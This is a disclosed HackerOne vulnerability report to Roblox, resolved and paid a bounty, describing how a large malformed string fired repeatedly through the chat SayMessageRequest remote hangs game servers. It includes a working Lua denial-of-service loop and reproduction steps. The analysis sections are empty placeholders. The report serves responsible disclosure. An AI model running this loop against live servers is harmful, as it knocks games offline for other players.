---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '679907'
original_report_id: '679907'
title: Malformed string sent through FireServer leads to server freezing/hanging
weakness: Uncontrolled Resource Consumption
team_handle: roblox
created_at: '2019-08-22T18:24:54.435Z'
disclosed_at: '2020-04-29T22:14:07.805Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 40
asset_identifier: Roblox Client
asset_type: DOWNLOADABLE_EXECUTABLES
max_severity: critical
tags:
- hackerone
- uncontrolled-resource-consumption
---

# Malformed string sent through FireServer leads to server freezing/hanging

## Metadata

- HackerOne Report ID: 679907
- Weakness: Uncontrolled Resource Consumption
- Program: roblox
- Disclosed At: 2020-04-29T22:14:07.805Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

This was found an hour ago so if I get any information wrong, please comment and I'll get back to you!

A cheater/exploiter can hang any Roblox gameserver due to a 5 line script which sends a big malformed string through SayMessageRequest resulting in the server to hang itself. This works in any game that has the "SayMessageRequest" remote and can be done easily, especially if the attacker has some sort of "script execution" exploit on their hands.

To reproduce this exploit:
Go into Roblox Client/Studio
Execute this into the cmdbar
```
local malformed = string.rep("ก็็็▌▓", math.random(10000, 2e5))
local remote = game:GetService'ReplicatedStorage'.DefaultChatSystemChatEvents:WaitForChild'SayMessageRequest'
while wait() do
	remote:FireServer(malformed, malformed)
end
```
Watch the server hang itself (try walking around).

Note: If done on Studio while playing solo, it seems to hang the entire program. Luckily I found a workaround to this by testing it in a local server with 2-3 players and then executing it on any of the player instances.

I've attached a PoC video.

## Impact

Hang/Freeze any game servers which isn't intended.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
